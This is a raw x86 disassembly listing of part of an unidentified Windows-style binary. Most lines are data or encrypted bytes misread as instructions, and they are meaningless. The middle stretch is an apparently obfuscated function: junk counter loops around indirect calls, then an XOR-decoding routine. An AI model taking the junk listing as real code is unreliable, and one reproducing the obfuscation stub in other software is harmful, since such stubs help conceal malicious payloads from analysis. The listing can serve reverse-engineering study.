  415ef7:	dec    ecx
  415ef8:	ror    BYTE PTR [edx+0x7873a0f4],1
  415efe:	retf   
  415eff:	(bad)  
  415f00:	in     eax,0xd5
  415f02:	xchg   esi,eax
  415f03:	out    dx,al
  415f04:	arpl   WORD PTR [ebx-0x63],di
  415f07:	cs push ss
  415f09:	sbb    DWORD PTR [eax-0x2b],0xfd8336f9
  415f10:	or     al,0x96
  415f12:	adc    dh,BYTE PTR [ecx]
  415f14:	cmp    DWORD PTR [esi+0x351abae8],ecx
  415f1a:	ins    DWORD PTR es:[edi],dx
  415f1b:	xchg   ebp,eax
  415f1c:	push   ebp
  415f1d:	pop    ecx
  415f1e:	scas   eax,DWORD PTR es:[edi]
  415f1f:	imul   eax,edx,0xfffffff9
  415f22:	xor    BYTE PTR [esi],dh
  415f24:	mov    al,0x55
  415f26:	icebp  
  415f27:	das    
  415f28:	cmp    ch,bl
  415f2a:	push   0x48
  415f2c:	addr16 in eax,0xc3
  415f2f:	jecxz  0x415f71
  415f31:	ins    BYTE PTR es:[edi],dx
  415f32:	pop    esi
  415f33:	inc    ebp
  415f34:	ror    BYTE PTR [ecx],0x31
  415f37:	cmp    dh,ah
  415f39:	cwde   
  415f3a:	xor    esp,DWORD PTR [edx+ecx*8-0x772f0c2b]
  415f41:	mov    DWORD PTR [ecx+0x744376c0],edx
  415f47:	push   ecx
  415f48:	sbb    ch,dh
  415f4a:	mov    eax,0x6f789003
  415f4f:	jg     0x415fb6
  415f51:	cmp    al,0xb7
  415f53:	test   ecx,edx
  415f55:	dec    ebp
  415f56:	push   0xffffff9c
  415f58:	or     bl,bh
  415f5a:	lods   eax,DWORD PTR ds:[esi]
  415f5b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f5d:	outs   dx,BYTE PTR ds:[esi]
  415f5e:	ret    
  415f5f:	mov    esi,0xa8f144ff
  415f64:	add    BYTE PTR [ecx-0x1a713228],al
  415f6a:	scas   eax,DWORD PTR es:[edi]
  415f6b:	jmp    0xaff24333
  415f70:	(bad)  
  415f71:	pop    ss
  415f72:	clc    
  415f73:	xor    DWORD PTR ds:0xb0bf4cc4,ebx
  415f79:	out    0x6b,eax
  415f7b:	pop    ebx
  415f7c:	cmp    cl,BYTE PTR [eax]
  415f7e:	test   eax,0xc7c86caa
  415f83:	jns    0x415f28
  415f85:	cdq    
  415f86:	or     DWORD PTR [edi+0x79],esi
  415f89:	(bad)  
  415f8a:	xchg   esp,eax
  415f8b:	and    ebx,ebx
  415f8d:	sar    BYTE PTR [eax+0x4ed8f3f3],0x4a
  415f94:	outs   dx,DWORD PTR ds:[esi]
  415f95:	les    esi,FWORD PTR [edi+0x21957122]
  415f9b:	popa   
  415f9c:	aaa    
  415f9d:	jp     0x415f78
  415f9f:	cmp    bh,BYTE PTR [edx-0x4b031300]
  415fa5:	scas   al,BYTE PTR es:[edi]
  415fa6:	sar    bh,1
  415fa8:	xchg   ebp,eax
  415fa9:	leave  
  415faa:	stc    
  415fab:	mov    eax,ds:0xf531ad31
  415fb0:	lahf   
  415fb1:	jne    0x415fba
  415fb3:	cmc    
  415fb4:	daa    
  415fb5:	je     0x415f8a
  415fb7:	push   0x3b2ab57c
  415fbc:	popf   
  415fbd:	lods   al,BYTE PTR ds:[esi]
  415fbe:	sub    eax,0x10fe5ea9
  415fc3:	fstp   TBYTE PTR [ecx+ebx*1]
  415fc6:	cld    
  415fc7:	lea    esi,[edi+0x58f4c2e8]
  415fcd:	loopne 0x415faf
  415fcf:	mov    DWORD PTR [edx],ebp
  415fd1:	idiv   BYTE PTR [edi+0x56380cab]
  415fd7:	retf   0xac59
  415fda:	pop    ds
  415fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fdc:	int    0x75
  415fde:	jno    0x415fb1
  415fe0:	repnz ins DWORD PTR es:[edi],dx
  415fe2:	xor    DWORD PTR [edx+0x62eec51b],0x3b33c458
  415fec:	pop    ebx
  415fed:	sbb    edx,esp
  415fef:	repnz inc ecx
  415ff1:	ret    
  415ff2:	addr16 pop ds
  415ff4:	jnp    0x415fc4
  415ff6:	in     eax,0xec
  415ff8:	in     eax,0xa
  415ffa:	mov    esp,0x8026f7fe
  415fff:	fistp  WORD PTR [esi+0x4a91a368]
  416005:	dec    eax
  416006:	add    bl,BYTE PTR [ebp-0x5a]
  416009:	mov    dl,0x5
  41600b:	call   0xebac:0xf28fd78c
  416012:	cmp    al,0x38
  416014:	leave  
  416015:	mov    ?,ecx
  416017:	pop    edx
  416018:	cmc    
  416019:	and    BYTE PTR [edi-0x14],dl
  41601c:	pusha  
  41601d:	icebp  
  41601e:	fisttp WORD PTR [ecx+0x42]
  416021:	repnz xor dl,cl
  416024:	aam    0x74
  416026:	je     0x416053
  416028:	add    ecx,DWORD PTR [esi+0x4061b2cf]
  41602e:	sub    DWORD PTR [edx-0x19d5b8bf],ecx
  416034:	ror    BYTE PTR [edi+0x2c],cl
  416037:	sub    eax,0xbcbf9294
  41603c:	push   edi
  41603d:	out    0xf8,eax
  41603f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416040:	push   esp
  416041:	or     ch,bl
  416043:	fcom   DWORD PTR [ebp-0x409826e0]
  416049:	jb     0x415fd6
  41604b:	inc    esi
  41604c:	sbb    esi,esp
  41604e:	push   edx
  41604f:	nop
  416050:	loopne 0x41604d
  416052:	cld    
  416053:	ret    0x164f
  416056:	neg    ah
  416058:	les    ecx,FWORD PTR ds:0x9ec4cf2b
  41605e:	adc    al,0x1
  416060:	jae    0x416091
  416062:	xor    al,ah
  416064:	or     DWORD PTR [ecx-0x2],ecx
  416067:	loopne 0x4160b0
  416069:	mov    dh,0x6a
  41606b:	mov    ebp,0x825c9a4e
  416070:	js     0x416067
  416072:	push   edx
  416073:	fisttp QWORD PTR [eax+0x72277a1a]
  416079:	mov    ch,0xd1
  41607b:	cmp    DWORD PTR [edx+esi*1],edx
  41607e:	push   es
  41607f:	add    eax,0x497b8351
  416084:	mov    al,ds:0x13442508
  416089:	ins    DWORD PTR es:[edi],dx
  41608a:	add    eax,0xb47a7b67
  41608f:	jae    0x416060
  416091:	ds das 
  416093:	sbb    eax,0x9b42821f
  416098:	hlt    
  416099:	add    ch,ah
  41609b:	xchg   ebx,eax
  41609c:	mov    ds,WORD PTR es:[ebx+0x40]
  4160a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160a1:	test   al,dh
  4160a3:	fstp   TBYTE PTR [edi-0x12]
  4160a6:	stc    
  4160a7:	pusha  
  4160a8:	xlat   BYTE PTR ds:[ebx]
  4160a9:	enter  0xe0d4,0x52
  4160ad:	xchg   BYTE PTR [edx+0x78],dl
  4160b0:	out    dx,eax
  4160b1:	icebp  
  4160b2:	push   0xeced8d92
  4160b7:	popf   
  4160b8:	fdivrp st(1),st
  4160ba:	mov    ebp,0x6f3d36b6
  4160bf:	pusha  
  4160c0:	iret   
  4160c1:	mov    ebp,0x94b74abe
  4160c6:	push   edi
  4160c7:	sub    bh,ah
  4160c9:	sbb    BYTE PTR [ecx-0x6d],bl
  4160cc:	pop    edx
  4160cd:	mov    edx,0xa11f8840
  4160d2:	sub    eax,0xc2135b07
  4160d7:	xchg   ah,cl
  4160d9:	sbb    al,0x58
  4160db:	out    0x26,al
  4160dd:	outs   dx,BYTE PTR ds:[esi]
  4160de:	mov    ecx,0x3477e757
  4160e3:	shl    DWORD PTR [eax],1
  4160e5:	das    
  4160e6:	or     ebp,edi
  4160e8:	ds enter 0x57bc,0x3a
  4160ed:	push   edi
  4160ee:	jno    0x416165
  4160f0:	add    dh,BYTE PTR [edi-0x7253a830]
  4160f6:	mov    ch,0x6
  4160f8:	mov    eax,DWORD PTR [edx-0xf]
  4160fb:	jno    0x41612c
  4160fd:	imul   eax,edi,0x32
  416100:	test   eax,0xe895e6e5
  416105:	mov    ch,0x3e
  416107:	icebp  
  416108:	cmp    al,0xac
  41610a:	sbb    al,0xa4
  41610c:	(bad)  
  41610f:	test   eax,0xefa5092b
  416114:	dec    ebx
  416115:	ret    0x21eb
  416118:	sub    al,0x16
  41611a:	jmp    0x416186
  41611c:	popf   
  41611d:	add    DWORD PTR [ebp-0x3a],0x57
  416121:	es in  eax,dx
  416123:	pop    eax
  416124:	jp     0x416145
  416126:	test   al,0xce
  416128:	jl     0x416141
  41612a:	mov    dl,0x97
  41612c:	adc    eax,DWORD PTR [ecx+0x76]
  41612f:	lds    ecx,FWORD PTR [ebp+0x1f717ae8]
  416135:	adc    eax,0x643687bc
  41613a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41613b:	adc    ebp,esp
  41613d:	or     bl,BYTE PTR [ebx-0x1e]
  416140:	xchg   esi,eax
  416141:	test   eax,0x56c13ae2
  416146:	cs pop ebp
  416148:	or     DWORD PTR [edx-0x7f],edi
  41614b:	outs   dx,DWORD PTR ds:[esi]
  41614c:	mov    edi,0xb9e276b3
  416151:	xchg   edx,eax
  416152:	mov    esi,0x4d9b791
  416157:	stos   DWORD PTR es:[edi],eax
  416158:	into   
  416159:	out    dx,eax
  41615a:	cmp    dl,BYTE PTR [ebp+0x4f]
  41615d:	mov    ebp,DWORD PTR ds:0xf2b6ba01
  416163:	sub    DWORD PTR [esi+0x62],edx
  416166:	jp     0x416176
  416168:	div    DWORD PTR [edx]
  41616a:	xchg   BYTE PTR [ebp+0x4e92f7c0],bh
  416170:	mov    ecx,0x9c7bbfa8
  416175:	sbb    dl,bl
  416177:	lods   eax,DWORD PTR ds:[esi]
  416178:	jnp    0x4160fb
  41617a:	jl     0x41610c
  41617c:	sbb    al,0xa1
  41617e:	sub    DWORD PTR [edx],esp
  416180:	jae    0x41615f
  416182:	int3   
  416183:	daa    
  416184:	or     eax,0x43ecaea7
  416189:	bound  ebp,QWORD PTR ss:[esp+eiz*8-0x2e]
  41618e:	adc    BYTE PTR [esi-0x3ab739e],al
  416194:	adc    al,0xea
  416196:	mov    al,ds:0xbc9a2d98
  41619b:	mov    esp,DWORD PTR [eax+0x490a5519]
  4161a1:	pop    esp
  4161a2:	pop    ebx
  4161a3:	dec    ebx
  4161a4:	jns    0x4161bb
  4161a6:	mov    dh,dl
  4161a8:	sub    al,0xe9
  4161aa:	push   cs
  4161ab:	sub    BYTE PTR [ecx-0x4489dd2d],ah
  4161b1:	hlt    
  4161b2:	popa   
  4161b3:	push   esp
  4161b4:	fisub  DWORD PTR [ebx+edi*8+0x557abba3]
  4161bb:	jnp    0x41613d
  4161bd:	and    ebx,DWORD PTR [eax-0x4]
  4161c0:	pop    ss
  4161c1:	imul   edx,esi,0x13
  4161c4:	imul   esi,DWORD PTR [esi+0x62],0x67af66a6
  4161cb:	outs   dx,BYTE PTR ds:[esi]
  4161cc:	sti    
  4161cd:	mov    BYTE PTR [ebp-0x425a496c],bh
  4161d3:	test   al,0xcb
  4161d5:	je     0x4161c1
  4161d7:	enter  0x7f24,0xa0
  4161db:	sahf   
  4161dc:	sahf   
  4161dd:	sbb    dh,BYTE PTR [edx+0x33]
  4161e0:	push   eax
  4161e1:	popf   
  4161e2:	int    0x38
  4161e4:	mov    eax,0x2fa3f3d7
  4161e9:	aam    0x59
  4161eb:	push   eax
  4161ec:	mov    al,0x62
  4161ee:	add    eax,0x1fbaf04f
  4161f3:	test   eax,0x65da24b8
  4161f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161f9:	fdiv   QWORD PTR [ecx-0x4ed7d87e]
  4161ff:	mov    BYTE PTR [ecx+0x4a95da89],ch
  416205:	sbb    BYTE PTR [esi-0x45],bh
  416208:	jnp    0x4161dd
  41620a:	mov    ecx,0x17f9b27f
  41620f:	push   0x826b3380
  416214:	aas    
  416215:	rol    BYTE PTR [ecx],cl
  416217:	inc    ebx
  416218:	add    ecx,ebp
  41621a:	dec    esi
  41621b:	inc    esp
  41621c:	shl    ecx,1
  41621e:	ficomp WORD PTR [eax]
  416220:	sub    al,0xe
  416222:	xor    eax,0xc95ec612
  416227:	ret    0x18
  41622a:	push   ebp
  41622b:	mov    ebp,esp
  41622d:	sub    esp,0x9c
  416233:	or     ecx,eax
  416235:	mov    ecx,DWORD PTR [ebp+0x8]
  416238:	adc    DWORD PTR ds:0x42a29e,0x5466
  416242:	mov    eax,0x8a98
  416247:	xor    ax,WORD PTR [ecx+0x20]
  41624b:	and    DWORD PTR ds:0x42a2d6,0x0
  416255:	jmp    0x416267
  41625a:	mov    ecx,DWORD PTR ds:0x42a2d6
  416260:	inc    ecx
  416261:	mov    DWORD PTR ds:0x42a2d6,ecx
  416267:	cmp    DWORD PTR ds:0x42a2d6,0x12
  41626e:	jae    0x4162bb
  416274:	cmp    DWORD PTR ds:0x42a2d6,0xa
  41627b:	jle    0x4162bb
  416281:	jmp    0x41629c
  416286:	push   0x5de0
  41628b:	push   0x42a26a
  416290:	push   DWORD PTR [ebp-0x28]
  416293:	push   DWORD PTR [ebp-0x10]
  416296:	call   DWORD PTR ds:0x42a3d2
  41629c:	cmp    DWORD PTR ds:0x42a2d6,0x9
  4162a3:	jne    0x4162b6
  4162a9:	mov    ecx,DWORD PTR ds:0x42a2d6
  4162af:	inc    ecx
  4162b0:	mov    DWORD PTR ds:0x42a2d6,ecx
  4162b6:	jmp    0x41625a
  4162bb:	mov    ecx,0x3b5a
  4162c0:	add    DWORD PTR ds:0x42a292,0x71f8
  4162ca:	add    ax,cx
  4162cd:	sbb    ecx,DWORD PTR ds:0x42a2d6
  4162d3:	movzx  eax,ax
  4162d6:	sbb    ecx,DWORD PTR ds:0x42a29a
  4162dc:	mov    DWORD PTR [ebp-0x10],eax
  4162df:	mov    BYTE PTR [ebp-0x1],0x7c
  4162e3:	and    DWORD PTR ds:0x42a2a2,ecx
  4162e9:	lea    eax,[ebp-0x1]
  4162ec:	mov    DWORD PTR [ebp-0xc],eax
  4162ef:	and    DWORD PTR ds:0x42a2be,0x0
  4162f9:	mov    ecx,DWORD PTR ds:0x42a2be
  4162ff:	inc    ecx
  416300:	mov    DWORD PTR ds:0x42a2be,ecx
  416306:	cmp    DWORD PTR ds:0x42a2be,0x25
  41630d:	jg     0x416346
  416313:	jmp    0x416339
  416318:	push   DWORD PTR [ebp-0x28]
  41631b:	push   0x5043
  416320:	push   DWORD PTR [ebp-0x18]
  416323:	push   DWORD PTR [ebp-0xc]
  416326:	push   DWORD PTR [ebp-0x1c]
  416329:	push   0x5d36
  41632e:	push   0x429153
  416333:	call   DWORD PTR ds:0x42a3d6
  416339:	cmp    DWORD PTR ds:0x42a2be,0x1a
  416340:	jb     0x4162f9
  416346:	mov    al,BYTE PTR [ebp-0x1]
  416349:	and    DWORD PTR ds:0x42a26e,0x0
  416353:	mov    ecx,DWORD PTR ds:0x42a26e
  416359:	inc    ecx
  41635a:	mov    DWORD PTR ds:0x42a26e,ecx
  416360:	cmp    DWORD PTR ds:0x42a26e,0x19
  416367:	jge    0x416385
  41636d:	jmp    0x416378
  416372:	call   DWORD PTR ds:0x42a3da
  416378:	cmp    DWORD PTR ds:0x42a26e,0x10
  41637f:	jb     0x416353
  416385:	mov    ecx,DWORD PTR [ebp-0xc]
  416388:	xor    al,0x7c
  41638a:	mov    DWORD PTR ds:0x42a2c6,0x2666
  416394:	inc    al
  416396:	and    DWORD PTR ds:0x42a2ce,0x42a28a
  4163a0:	mov    BYTE PTR [ecx],al
  4163a2:	sbb    DWORD PTR ds:0x42a2f6,0x5717
  4163ac:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  4163b3:	push   ebx
  4163b4:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4163bb:	mov    DWORD PTR ds:0x42a2f6,0x16
  4163c5:	cmp    DWORD PTR ds:0x42a2f6,0x0
  4163cc:	je     0x41640c
  4163d2:	cmp    DWORD PTR ds:0x42a2f6,0x1e
  4163d9:	jb     0x41640c
  4163df:	jmp    0x4163fc
  4163e4:	push   0x8db9
  4163e9:	push   DWORD PTR [ebp-0x1c]
  4163ec:	push   0x6bac
  4163f1:	push   0x6e74
  4163f6:	call   DWORD PTR ds:0x42a3de
  4163fc:	mov    eax,ds:0x42a2f6
  416401:	dec    eax
  416402:	mov    ds:0x42a2f6,eax
  416407:	jmp    0x4163c5
  41640c:	mov    ecx,DWORD PTR [ebp-0x18]
  41640f:	push   esi
  416410:	or     DWORD PTR ds:0x42a286,0x93e
  41641a:	mov    eax,0x75108aa
  41641f:	and    DWORD PTR ds:0x42a2e2,0x0
  416429:	jmp    0x41643d
  41642e:	xor    esi,esi
  416430:	add    esi,DWORD PTR ds:0x42a2e2
  416436:	inc    esi
  416437:	mov    DWORD PTR ds:0x42a2e2,esi
  41643d:	cmp    DWORD PTR ds:0x42a2e2,0x17
  416444:	jae    0x416481
  41644a:	cmp    DWORD PTR ds:0x42a2e2,0xa
  416451:	jl     0x416481
  416457:	jmp    0x416462
  41645c:	call   DWORD PTR ds:0x42a3e2
  416462:	cmp    DWORD PTR ds:0x42a2e2,0x9
  416469:	jne    0x41647c
  41646f:	mov    esi,DWORD PTR ds:0x42a2e2
  416475:	inc    esi
  416476:	mov    DWORD PTR ds:0x42a2e2,esi
  41647c:	jmp    0x41642e
  416481:	xor    ecx,eax
  416483:	mov    esi,DWORD PTR ds:0x42a2ae
  416489:	sbb    esi,DWORD PTR ds:0x42a25a
  41648f:	mov    DWORD PTR ds:0x42a2ae,esi
  416495:	mov    esi,0x3272f1
  41649a:	push   edi
  41649b:	add    ecx,esi
  41649d:	jmp    0x4164b3
  4164a2:	inc    DWORD PTR ds:0x42a26e
  4164a8:	mov    dl,BYTE PTR [ebp-0x1]
  4164ab:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4164b2:	inc    ecx
  4164b3:	mov    DWORD PTR ds:0x42a286,0x7bd4
  4164bd:	cmp    ecx,0x40
  4164c0:	jb     0x4164a2
  4164c6:	not    edx
  4164c8:	mov    edx,DWORD PTR [ebp-0x18]
  4164cb:	xor    edx,eax
  4164cd:	mov    DWORD PTR ds:0x42a302,0x3db0
  4164d7:	add    edx,esi
  4164d9:	jmp    0x416628
  4164de:	movzx  edi,WORD PTR ds:0x42a296
  4164e5:	or     DWORD PTR ds:0x42a262,edi
  4164eb:	mov    edi,DWORD PTR [ebp+0x8]
  4164ee:	adc    DWORD PTR ds:0x42a286,edx
  4164f4:	mov    ecx,0x8a98
  4164f9:	adc    DWORD PTR ds:0x42a2fe,0x3816
  416503:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416508:	and    DWORD PTR ds:0x42a2ae,0x0
  416512:	jmp    0x416524
  416517:	mov    edi,DWORD PTR ds:0x42a2ae
  41651d:	inc    edi
  41651e:	mov    DWORD PTR ds:0x42a2ae,edi
  416524:	cmp    DWORD PTR ds:0x42a2ae,0x1f
  41652b:	jae    0x41657e
  416531:	cmp    DWORD PTR ds:0x42a2ae,0xa
  416538:	jbe    0x41657e
  41653e:	jmp    0x41655d
  416543:	push   0x42a25e
  416548:	push   0x6fb7
  41654d:	push   0x429009
  416552:	push   0x4290e8
  416557:	call   DWORD PTR ds:0x42a3ea
  41655d:	cmp    DWORD PTR ds:0x42a2ae,0x9
  416564:	jne    0x416579
  41656a:	xor    edi,edi
  41656c:	xor    edi,DWORD PTR ds:0x42a2ae
  416572:	inc    edi
  416573:	mov    DWORD PTR ds:0x42a2ae,edi
  416579:	jmp    0x416517
  41657e:	mov    edi,0x3b5a
  416583:	add    DWORD PTR ds:0x42a2fa,0x42a2c2
  41658d:	add    cx,di
  416590:	sbb    DWORD PTR ds:0x42a256,0x16d8
  41659a:	movzx  ecx,cx
  41659d:	and    DWORD PTR ds:0x42a2a2,0x42a29a
  4165a7:	mov    DWORD PTR [ebp-0xc],ecx
  4165aa:	and    DWORD PTR ds:0x42a26e,0x0
  4165b4:	xor    ecx,ecx
  4165b6:	xor    ecx,DWORD PTR ds:0x42a26e
  4165bc:	inc    ecx
  4165bd:	mov    DWORD PTR ds:0x42a26e,ecx
  4165c3:	cmp    DWORD PTR ds:0x42a26e,0x19
  4165ca:	jle    0x4165f5
  4165d0:	jmp    0x4165e8
  4165d5:	push   0x594c
  4165da:	push   0x42a276
  4165df:	push   DWORD PTR [ebp-0x1c]
  4165e2:	call   DWORD PTR ds:0x42a3ee
  4165e8:	cmp    DWORD PTR ds:0x42a26e,0x17
  4165ef:	jb     0x4165b4
  4165f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4165f8:	mov    DWORD PTR ds:0x42a29a,0x62ed
  416602:	movzx  ecx,WORD PTR [ecx+edx*4]
  416606:	xor    ecx,0x8a98
  41660c:	add    ecx,edi
  41660e:	mov    DWORD PTR ds:0x42a302,0x1620
  416618:	mov    edi,DWORD PTR [ebp-0xc]
  41661b:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416622:	mov    ecx,0x8de
  416627:	inc    edx
  416628:	mov    ecx,DWORD PTR [ebp-0x10]
  41662b:	mov    DWORD PTR ds:0x42a25a,0x2d30
  416635:	cmp    edx,ecx
  416637:	jne    0x4164de
  41663d:	and    edx,edx
  41663f:	mov    ecx,DWORD PTR [ebp-0x18]
  416642:	sub    edi,DWORD PTR ds:0x42a25a
  416648:	mov    edx,DWORD PTR [ebp+0x10]
  41664b:	xor    DWORD PTR ds:0x42a2ca,0xf9d
  416655:	xor    ecx,eax
  416657:	and    DWORD PTR ds:0x42a2c2,ebx
  41665d:	add    ecx,esi
  41665f:	mov    DWORD PTR [edx],ecx
  416661:	mov    ecx,DWORD PTR [ebp-0x18]
  416664:	sbb    DWORD PTR ds:0x42a2aa,0x1e81
  41666e:	jmp    0x4189c6
  416673:	mov    dl,0x1f
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	and    edx,edx
  416678:	mov    eax,ds:0xbec98882
  41667d:	js     0x4166c3
  41667f:	jle    0x4166e4
  416681:	leave  
  416682:	frndint 
  416684:	inc    ecx
  416685:	jl     0x41660a
  416687:	inc    esi
  416688:	pop    esi
  416689:	add    DWORD PTR [ebx-0x378a7b86],0xffffff82
  416690:	jl     0x4166cf
  416692:	sahf   
  416693:	clc    
  416694:	inc    esp
  416695:	jno    0x4166b5
  416697:	inc    edx
  416698:	jnp    0x416717
  41669a:	pusha  
  41669b:	je     0x41670d
  41669d:	add    BYTE PTR [esi-0x604629be],ch
  4166a3:	jle    0x416675
  4166a5:	popa   
  4166a6:	in     al,0x72
  4166a8:	fld    DWORD PTR [edx-0x6e]
  4166ab:	mov    ds:0xbb9faa49,eax
  4166b0:	cdq    
  4166b1:	fstp   DWORD PTR [ebp+0x55]
  4166b4:	out    0xab,eax
  4166b6:	pop    eax
  4166b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b8:	xchg   BYTE PTR [edx],ch
  4166ba:	mov    ecx,0x9bfb8f69
  4166bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166c0:	into   
  4166c1:	jns    0x4166af
  4166c3:	mov    eax,ds:0x3761a01c
  4166c8:	mov    ds:0x5b75527f,al
  4166cd:	pop    esp
  4166ce:	or     eax,0x8083be0f
  4166d3:	cs cwde 
  4166d5:	pop    ebx
  4166d6:	xchg   DWORD PTR [ebx+0x5819be1b],esi
  4166dc:	outs   dx,DWORD PTR ds:[esi]
  4166dd:	xchg   BYTE PTR [edi+0x4d72325],al
  4166e3:	cmp    al,0x86
  4166e5:	mov    gs,WORD PTR [esi-0x55268ad7]
  4166eb:	loop   0x41668a
  4166ed:	pushf  
  4166ee:	sar    DWORD PTR [edi-0x7823aa37],1
  4166f4:	sti    
  4166f5:	sub    eax,0x54973a43
  4166fa:	jcxz   0x41671e
  4166fd:	aaa    
  4166fe:	sar    BYTE PTR [edi],0xe4
  416701:	aad    0xf9
  416703:	push   ebp
  416704:	jnp    0x416764
  416706:	dec    ecx
  416707:	xor    BYTE PTR [ebx+0x7],0xee
  41670b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41670c:	dec    ebp
  41670d:	cmc    
  41670e:	int    0xeb
  416710:	mov    al,0xd7
  416712:	ja     0x4166e7
  416714:	mov    cl,0x33
  416716:	fimul  DWORD PTR [esi-0x74d21fc1]
  41671c:	out    0xd2,al
  41671e:	out    dx,eax
  41671f:	mov    cl,0x5a
  416721:	lods   al,BYTE PTR ds:[esi]
  416722:	mov    al,dl
  416724:	pop    esp
  416725:	shl    DWORD PTR [ebx-0x75],0x83
  416729:	jmp    0x18e90626
  41672e:	fisttp DWORD PTR gs:[ebp+0x2e]
  416732:	mov    ebp,0xfef085a8
  416737:	and    eax,edx
  416739:	std    
  41673a:	cmp    ebx,DWORD PTR [esi]
  41673c:	mov    ebp,0xcffbfda7
  416741:	imul   esp,DWORD PTR [ebp-0x50549a75],0x75
  416748:	inc    ebp
  416749:	jbe    0x416764
  41674b:	add    al,0x7c
  41674d:	xor    eax,0x8c3d5143
  416752:	bound  ebx,QWORD PTR [ecx]
  416754:	fwait
  416755:	dec    esp
  416756:	dec    ebx
  416757:	mov    cl,0x3
  416759:	pop    ebp
  41675a:	js     0x4167b8
  41675c:	retf   
  41675d:	fwait
  41675e:	repnz push esi
  416760:	popa   
  416761:	jmp    0xa42c:0xfdd570f2
  416768:	retf   
  416769:	xchg   BYTE PTR [edi-0x7d],ah
  41676c:	lock pop esi
  41676e:	sub    eax,0xe2039ba
  416773:	mov    ds:0x92e49f5d,al
  416778:	cmp    al,0x29
  41677a:	cmp    eax,0x73854d04
  41677f:	fadd   QWORD PTR [ebx-0x15d52b26]
  416785:	push   esi
  416786:	loop   0x41670d
  416788:	shl    DWORD PTR [eax+0x4eb69d72],1
  41678e:	sti    
  41678f:	fist   WORD PTR [ebp-0x59]
  416792:	outs   dx,DWORD PTR ds:[esi]
  416793:	arpl   si,cx
  416795:	in     eax,0xe7
  416797:	loope  0x416750
  416799:	(bad)  
  41679a:	cmc    
  41679b:	add    edx,DWORD PTR [esi+0x21067c5d]
  4167a1:	ret    
  4167a2:	dec    edi
  4167a3:	and    DWORD PTR [eax-0xe],0x2d267226
  4167aa:	add    BYTE PTR [eax+0x77f9adde],ah
  4167b0:	pop    ss
  4167b1:	pop    eax
  4167b2:	push   eax
  4167b3:	cdq    
  4167b4:	inc    esp
  4167b5:	sbb    DWORD PTR [eax+eax*1],ebx
  4167b8:	mov    cs,esp
  4167ba:	jle    0x7e2a6b26
  4167c0:	dec    ebx
  4167c1:	cld    
  4167c2:	mov    bl,0xad
  4167c4:	sub    al,0xa7
  4167c6:	cdq    
  4167c7:	pop    edi
  4167c8:	inc    ebp
  4167c9:	jge    0x4167b7
  4167cb:	ret    0x8fa7
  4167ce:	cli    
  4167cf:	inc    ecx
  4167d0:	in     eax,0xdc
  4167d2:	jl     0x4167e2
  4167d4:	jle    0x4167a6
  4167d6:	leave  
  4167d7:	mov    bh,0x48
  4167d9:	xchg   edi,eax
  4167da:	sub    ch,BYTE PTR [ecx-0x5e9c0680]
  4167e0:	cmp    al,0xdc
  4167e2:	cmp    DWORD PTR [esi+0x56],ebx
  4167e5:	pop    ebp
  4167e6:	inc    esp
  4167e7:	js     0x416808
  4167e9:	mov    ah,0x9b
  4167eb:	pop    ebx
  4167ec:	xchg   ebp,eax
  4167ed:	mov    WORD PTR [esi-0x35750d68],cs
  4167f3:	pop    esi
  4167f4:	xchg   edi,eax
  4167f5:	test   DWORD PTR [ebx],edx
  4167f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f8:	mov    WORD PTR [edx-0x157f82b6],?
  4167fe:	lock cdq 
  416800:	(bad)  
  416801:	jns    0x4167d9
  416803:	test   al,0x7b
  416805:	or     al,0xff
  416807:	in     eax,dx
  416808:	and    eax,0x918d5768
  41680d:	in     al,dx
  41680e:	mov    esi,0x87bc1e31
  416813:	mov    bl,0x5e
  416815:	pop    edi
  416816:	in     al,dx
  416817:	(bad)  
  416818:	adc    al,0xb3
  41681a:	mov    esp,0xd4785284
  41681f:	in     al,0xa6
  416821:	and    dl,BYTE PTR [eax+0x786ad6c1]
  416827:	adc    BYTE PTR [ebp+0x59],cl
  41682a:	xlat   BYTE PTR ds:[ebx]
  41682b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41682c:	cmp    bh,BYTE PTR [edi+0x7636e217]
  416832:	mov    edi,DWORD PTR [esi]
  416834:	popf   
  416835:	and    al,BYTE PTR [esi-0x25]
  416838:	(bad)  
  416839:	je     0x416813
  41683b:	and    bl,dh
  41683d:	sbb    DWORD PTR [edx-0x5c],edx
  416840:	sub    DWORD PTR ds:0xb592d59f,ebp
  416846:	dec    esi
  416847:	jle    0x416850
  416849:	push   0xffffffb2
  41684b:	jp     0x41685c
  41684d:	fwait
  41684e:	js     0x416815
  416850:	sub    DWORD PTR [edi+0x56f3a98b],edx
  416856:	sub    eax,0xc88922c5
  41685b:	daa    
  41685c:	dec    ecx
  41685d:	aad    0xa1
  41685f:	in     eax,0xb9
  416861:	ds jg  0x416872
  416864:	fisubr DWORD PTR [edi+0x15]
  416867:	jns    0x41689f
  416869:	(bad)  [esi+0x26fc7cd4]
  41686f:	test   eax,0x237b8e0
  416874:	push   ds
  416875:	mov    ecx,0x883e5765
  41687a:	xor    DWORD PTR [eax],esi
  41687c:	sti    
  41687d:	sub    BYTE PTR [esi-0x3a],ah
  416880:	adc    eax,0xb3f2ad1a
  416885:	sbb    DWORD PTR [esi],edx
  416887:	xchg   DWORD PTR [ebx+0x6ce462bd],esp
  41688d:	loope  0x41685e
  41688f:	(bad)  
  416890:	out    dx,al
  416891:	(bad)  
  416892:	bound  ecx,QWORD PTR [ecx]
  416894:	sbb    ecx,eax
  416896:	xor    al,0x6
  416898:	add    ch,BYTE PTR [eax+esi*1]
